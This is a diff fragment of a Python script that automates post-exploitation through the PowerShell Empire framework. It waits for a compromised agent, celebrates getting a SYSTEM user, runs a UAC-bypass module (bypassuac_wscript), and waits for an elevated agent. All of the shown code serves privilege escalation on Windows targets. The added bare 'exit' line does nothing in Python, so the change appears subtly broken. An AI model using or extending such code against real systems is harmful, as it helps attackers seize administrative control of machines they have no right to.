@@ -27,6 +27,7 @@ try:
         agent = empire_wait_for_agent.run(API, hostname, True, 120)
         if agent is not None:
             print('yeay!!! we got an SYSTEM user')
+        exit
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac_wscript.path)
     # wait for privileged agent for 120 seconds
     agent = empire_wait_for_agent.run(API, hostname, True, 120)
